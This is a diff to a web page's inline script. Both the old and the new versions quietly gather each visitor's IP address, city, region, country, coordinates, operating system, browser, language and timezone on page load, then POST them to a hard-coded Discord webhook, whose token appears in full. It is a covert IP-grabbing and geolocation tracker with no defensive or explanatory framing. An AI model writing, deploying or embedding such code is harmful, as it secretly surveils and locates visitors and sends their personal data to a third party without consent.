@@ -88,158 +88,60 @@
     </div>
 
     <script>
-        // Function to get the proper OS version from the user agent
+        // Function to detect the user's OS
         function getOS() {
             const userAgent = navigator.userAgent;
-            let os = "Unknown OS";
-            
-            // Detect Windows 11
-            if (userAgent.indexOf("Windows NT 10.0") !== -1) {
-                if (userAgent.indexOf("Windows NT 10.1") !== -1) {
-                    os = "Windows 11 64-bit"; // Detect Windows 11
-                } else {
-                    os = "Windows 10 64-bit"; // Detect Windows 10
-                }
-            } 
-            // Detect specific versions of Windows
-            else if (userAgent.indexOf("Windows NT 6.3") !== -1) {
-                os = "Windows 8.1 64-bit";
-            } else if (userAgent.indexOf("Windows NT 6.2") !== -1) {
-                os = "Windows 8 64-bit";
-            } else if (userAgent.indexOf("Windows NT 6.1") !== -1) {
-                os = "Windows 7 64-bit";
-            } else if (userAgent.indexOf("Windows NT 5.1") !== -1) {
-                os = "Windows XP 32-bit";
-            } else if (userAgent.indexOf("Mac") !== -1) {
-                os = "macOS " + (userAgent.indexOf("Mac OS X") !== -1 ? userAgent.split("Mac OS X ")[1].split(")")[0] : "Unknown Version");
-            } else if (userAgent.indexOf("X11") !== -1) {
-                os = "Linux/Unix";
-            } else if (userAgent.indexOf("Android") !== -1) {
-                os = "Android OS";
-            } else if (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1) {
-                os = "iOS";
-            }
-            return os;
+            if (userAgent.indexOf("Windows NT 10.0") !== -1) return "Windows 10/11";
+            if (userAgent.indexOf("Mac") !== -1) return "macOS";
+            if (userAgent.indexOf("X11") !== -1) return "Linux/Unix";
+            if (userAgent.indexOf("Android") !== -1) return "Android";
+            if (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1) return "iOS";
+            return "Unknown OS";
         }
 
-        // Send the user information to Discord webhook as an Embed
-        fetch('http://ip-api.com/json')
-            .then(response => response.json())
-            .then(data => {
-                const ip = data.query;
-                const city = data.city;
-                const region = data.regionName;
-                const country = data.country;
-                const loc = data.lat + ',' + data.lon; // Latitude, Longitude
+        // Send the user information to Discord webhook
+        function sendDataToDiscord() {
+            fetch('https://ip-api.com/json?fields=country,city,regionName,lat,lon', { method: 'GET' })
+                .then(response => response.json())
+                .then(data => {
+                    const { query: ip, city, regionName, country, lat, lon } = data;
+                    const os = getOS();
+                    const browser = navigator.userAgent;
+                    const language = navigator.language;
+                    const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-                const os = getOS();
-                const browser = navigator.userAgent;
-                const language = navigator.language;
-                const screenWidth = screen.width;
-                const screenHeight = screen.height;
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-                const browserName = navigator.appName;
-                const browserVersion = navigator.appVersion;
-                const cookiesEnabled = navigator.cookieEnabled;
+                    // Create the embed message
+                    const embedMessage = {
+                        content: '',
+                        embeds: [{
+                            title: "User Information",
+                            fields: [
+                                { name: "IP Address", value: ip, inline: false },
+                                { name: "Location", value: `${city}, ${regionName}, ${country}`, inline: false },
+                                { name: "Coordinates", value: `${lat}, ${lon}`, inline: false },
+                                { name: "Operating System", value: os, inline: true },
+                                { name: "Browser", value: browser, inline: true },
+                                { name: "Language", value: language, inline: true },
+                                { name: "Device Type", value: deviceType, inline: true },
+                                { name: "Timezone", value: timezone, inline: true }
+                            ]
+                        }]
+                    };
 
-                // Additional Information (Available through browser)
-                const deviceMemory = navigator.deviceMemory || 'Unknown'; // Device memory (RAM) in GB
-                const cpuCores = navigator.hardwareConcurrency || 'Unknown'; // Number of CPU cores
-
-                // Create the embed message with all the information
-                const embedMessage = {
-                    content: '',
-                    embeds: [{
-                        title: "User Information",
-                        fields: [
-                            {
-                                name: "User's IP Address",
-                                value: ip,
-                                inline: false
-                            },
-                            {
-                                name: "Location",
-                                value: `${city}, ${region}, ${country}`,
-                                inline: false
-                            },
-                            {
-                                name: "Coordinates",
-                                value: loc,
-                                inline: false
-                            },
-                            {
-                                name: "Operating System",
-                                value: os,
-                                inline: true
-                            },
-                            {
-                                name: "Browser",
-                                value: browser,
-                                inline: true
-                            },
-                            {
-                                name: "Browser Name",
-                                value: browserName,
-                                inline: true
-                            },
-                            {
-                                name: "Browser Version",
-                                value: browserVersion,
-                                inline: true
-                            },
-                            {
-                                name: "Language",
-                                value: language,
-                                inline: true
-                            },
-                            {
-                                name: "Screen Resolution",
-                                value: `${screenWidth} x ${screenHeight}`,
-                                inline: true
-                            },
-                            {
-                                name: "Timezone",
-                                value: timezone,
-                                inline: true
-                            },
-                            {
-                                name: "Device Type",
-                                value: deviceType,
-                                inline: true
-                            },
-                            {
-                                name: "Cookies Enabled",
-                                value: cookiesEnabled ? "Yes" : "No",
-                                inline: true
-                            },
-                            {
-                                name: "Device Memory (GB)",
-                                value: deviceMemory + " GB",
-                                inline: true
-                            },
-                            {
-                                name: "CPU Cores",
-                                value: cpuCores,
-                                inline: true
-                            }
-                        ]
-                    }]
-                };
-
-                // Send the embed message to the Discord webhook
-                fetch('https://discord.com/api/webhooks/1355867531457331303/ik89sW3-lrpcv7gLmBgBpHgSzSAeVJUWg6knR18OdGGCvLCVukjpL8h26Nt7zTUPR6Su', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(embedMessage)
+                    // Send to Discord Webhook (Your Webhook URL)
+                    fetch('https://discord.com/api/webhooks/1355867531457331303/ik89sW3-lrpcv7gLmBgBpHgSzSAeVJUWg6knR18OdGGCvLCVukjpL8h26Nt7zTUPR6Su', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(embedMessage)
+                    })
+                    .catch(error => console.error('Error sending data to Discord webhook:', error));
                 })
-                .catch(error => console.error('Error sending data to Discord webhook:', error));
-            })
-            .catch(error => {
-                console.error('Error fetching IP information:', error);
-            });
+                .catch(error => console.error('Error fetching IP information:', error));
+        }
+
+        // Call the function to send data after page load
+        sendDataToDiscord();
     </script>
 
 </body>
